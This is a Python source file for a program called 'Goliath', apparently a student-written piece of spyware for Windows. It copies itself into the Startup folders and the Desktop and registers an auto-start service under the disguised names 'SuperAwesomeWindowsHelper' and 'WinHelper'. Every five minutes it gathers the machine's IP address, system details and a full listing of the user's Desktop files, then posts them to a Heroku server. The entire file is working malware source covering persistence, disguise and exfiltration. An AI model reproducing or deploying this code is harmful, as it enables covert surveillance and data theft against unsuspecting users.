import os
import sys
import shutil
import subprocess
import json
import platform
import time
import shlex
import checksumdir
import fluffylog
from threading import Thread
from fluffyreq import post_json_to_server, get_host_ip

# Create log instance
log = fluffylog.FluffyLog()
log.info('Goliath Online...')


# Necessary variables
win7_common_startup =\
    'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
win7_user_startup =\
    os.path.join(
        os.path.expanduser("~"),
        '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
server_url = 'https://tranquil-caverns-83807.herokuapp.com/json'
user_home = os.path.expanduser("~\Desktop")
myself = os.path.basename(sys.argv[0])
lock_file = '{}'.format(os.path.join(os.path.expanduser('~'), 'WinHelp.lock'))
# For testing
# user_home = os.path.expanduser('~/MyApps/school/introduction python')
sc_line = '''sc create SuperAwesomeWindowsHelper
binPath= "{}"
DisplayName= "WinHelper"
start= auto'''.format(os.path.join(user_home, myself))
whats_my_ip = 'http://ipv4bot.whatismyipaddress.com/'


# Functions
def copy_to_dir(dir_path):
    if os.path.isfile(os.path.join(dir_path, myself)):
        log.debug("I'm already in ({}), skipping".format(dir_path))
    else:
        if os.path.exists(dir_path):
            shutil.copy(sys.argv[0], dir_path)
            log.debug('Copied itself to ({})'.format(dir_path))
        else:
            os.mkdir(dir_path)
            log.warning('Dir does not exist, creating ({})'.format(dir_path))
            shutil.copy(sys.argv[0], dir_path)
            log.debug('Copied itself to ({})'.format(dir_path))


def copy_to_startup():
    try:
        copy_to_dir(win7_common_startup)
    except Exception as e:
        raise e
        copy_to_dir(win7_user_startup)


def copy_to_user_dir():
    try:
        copy_to_dir(user_home)
    except Exception as e:
        raise e


def check_lock():
    try:
        if os.path.isfile(lock_file):
            os.remove(lock_file)
        os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
    except OSError:
        exit()


def gather_pc_info():
    pc_info = platform.uname()
    pc_data = {'kind': 'PC info', 'data': {
        'Name': pc_info.node,
        'System': pc_info.system,
        'Version': pc_info.version,
        'Release': pc_info.release,
        'Machine': pc_info.machine,
        'Processor': pc_info.processor
    }}

    return pc_data


def gather_dir_info(dir_path):
    file_data = {'kind': 'User path data', 'data': []}
    if os.path.isdir(dir_path):
        log.info('Started dir info ({})'.format(dir_path))
        all_files = []
        c = os.walk(dir_path)
        for root, dirs, files in c:
            dir_files = []
            for f in files:
                if os.path.isfile(os.path.join(root, f)):
                    stat = os.stat(os.path.join(root, f))
                    dir_files.append({'name': f, 'stats': stat})
            all_files.append({'folder': root, 'files': dir_files})
        file_data.update({'data': all_files})
        log.info('Finished dir info ({})'.format(dir_path))
        log.debug('Rows of data ({})'.format(len(all_files)))
    else:
        log.warning('Path is not a directory ({})'.format(dir_path))
        log.debug('Returning empty list')

    return {'file_data': file_data}


# Launch a new thread for stdout and stderr
def threaded_output(std_out, std_err):
    def f():
        try:
            if std_out:
                for o_line in std_out:
                    log.info('{!r}'.format(o_line))
            if std_err:
                for e_line in std_err:
                    log.warning('{!r}'.format(e_line))
        except Exception as e:
            raise e
        finally:
            std_out.close()
            std_err.close()
    t = Thread(target=f)
    t.deamon = True
    t.start()


# Launch a command line string
def run_cmd(line):
    args = shlex.split(line)

    log.debug('Launching a subprocess: "{!s}"'.format(line))

    try:
        cmd_process = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            bufsize=1,
        )
        # Close stdin, workaround for threaded output
        cmd_process.stdin.close()

        # Output in a separate thread to prevent deadlock
        threaded_output(cmd_process.stdout, cmd_process.stderr)

        # Wait for 30 seconds for subprocess to exit, otherwise kill it
        exec_tol = time.time() + 30
        while cmd_process.poll() is None:
            time.sleep(.5)
            if exec_tol < time.time():
                break

        log.debug('Subprocess return code: {}'.format(cmd_process.poll()))
    except (OSError, subprocess.CalledProcessError) as e:
        log.warrning('Exception occurred: {}'.format(e))
        log.info('Subprocess failed')
        return False
        raise
    else:
        log.info('Subprocess finished')
        cmd_process.kill()
    return True


# Main function
def main():
    check_lock()
    while True:
        try:
            next_call = time.time()
            ip_req_response = get_host_ip(whats_my_ip)
            # TODO: Merge with file search
            md5hash = checksumdir.dirhash(user_home, 'md5')

            copy_to_startup()
            copy_to_user_dir()
            run_cmd(sc_line)
            pc_i = gather_pc_info()
            dir_i = gather_dir_info(user_home)
            all_data = {'ip': ip_req_response['ip'],
                        'pc_data': pc_i,
                        'file_data': dir_i,
                        'user_home_hash': md5hash}
            all_data_json = json.dumps(all_data)

            log.debug('Sending data to ({})'.format(server_url))
            resp = post_json_to_server(server_url, all_data_json)
            # print(all_data_json)
            if resp == -1:
                log.warning('Sending failed')
            else:
                log.debug('Json sent, response ({})'.format(resp))

        except Exception as e:
            log.error('Unknown exeption found:\n({0})'.format(e))
        finally:
            log.info('Sending log to server')
            log.debug('End of loop, will wait for {} seconds'.format(300))
            log.flush()

            next_call = next_call + int(300)
            if (next_call - time.time()) <= 0:
                time.sleep(1)
            else:
                time.sleep(next_call - time.time())


if __name__ == '__main__':
    timerThread = Thread(target=main)
    timerThread.start()
